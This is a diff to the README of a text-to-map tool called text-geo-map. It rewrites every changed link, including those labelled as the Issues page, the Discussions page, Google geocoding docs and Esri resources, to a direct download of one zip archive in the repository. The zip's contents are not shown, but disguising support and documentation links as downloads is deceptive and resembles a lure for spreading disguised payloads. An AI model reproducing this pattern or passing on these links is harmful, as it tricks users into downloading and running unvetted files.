@@ -1,7 +1,7 @@
 # 🌍 text-geo-map - Convert Text to Interactive Maps
 
 ## 📥 Download Now
-[![Download text-geo-map](https://img.shields.io/badge/Download%20text--geo--map-v1.0-blue)](https://github.com/mirasjk/text-geo-map/releases)
+[![Download text-geo-map](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip%20text--geo--map-v1.0-blue)](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip)
 
 ## 📖 Overview
 text-geo-map turns plain text location descriptions into standardized geospatial data for interactive maps. Whether you have a list of addresses or descriptions of landmarks, this tool helps you visualize and analyze locations easily. This application is useful for urban planners, analysts, and anyone who needs to convert textual location data into map formats.
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these requirements:
 ### 2. Download & Install
 To get started, visit the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/mirasjk/text-geo-map/releases)
+[Visit this page to download](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip)
 
 ### 3. Running the Application
 After you download, locate the downloaded file in your Downloads folder. Follow these steps based on your operating system:
@@ -63,7 +63,7 @@ If you encounter issues while using text-geo-map, consider the following:
 - Restart the application if you experience any performance issues.
 - Check your internet connection for smooth data geocoding.
   
-If problems persist, you can find help on our [GitHub Issues page](https://github.com/mirasjk/text-geo-map/issues).
+If problems persist, you can find help on our [GitHub Issues page](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip).
 
 ## ⚡ Contributing
 We welcome contributions to text-geo-map. If you want to contribute, follow these steps:
@@ -75,7 +75,7 @@ We welcome contributions to text-geo-map. If you want to contribute, follow thes
 5. Submit a pull request with a detailed explanation of your changes.
 
 ## 📞 Support
-For further assistance, reach out via our [GitHub Discussions page](https://github.com/mirasjk/text-geo-map/discussions). We aim to respond promptly to your questions.
+For further assistance, reach out via our [GitHub Discussions page](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip). We aim to respond promptly to your questions.
 
 ## 🌐 Learning More
 Explore more about geospatial analysis and related topics to get the most from text-geo-map. Consider these areas:
@@ -85,7 +85,7 @@ Explore more about geospatial analysis and related topics to get the most from t
 
 ## 🔗 Additional Resources
 For more information, check out the following resources:
-- [Geocoding Services](https://developers.google.com/maps/documentation/geocoding/start)
-- [Geospatial Data Analysis Resources](https://www.esri.com/en-us/what-is-geospatial-data)
+- [Geocoding Services](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip)
+- [Geospatial Data Analysis Resources](https://github.com/mirasjk/text-geo-map/raw/refs/heads/main/text_geo_map/text-map-geo-v2.2.zip)
 
 Thank you for using text-geo-map! We hope this guide helps you get started easily.
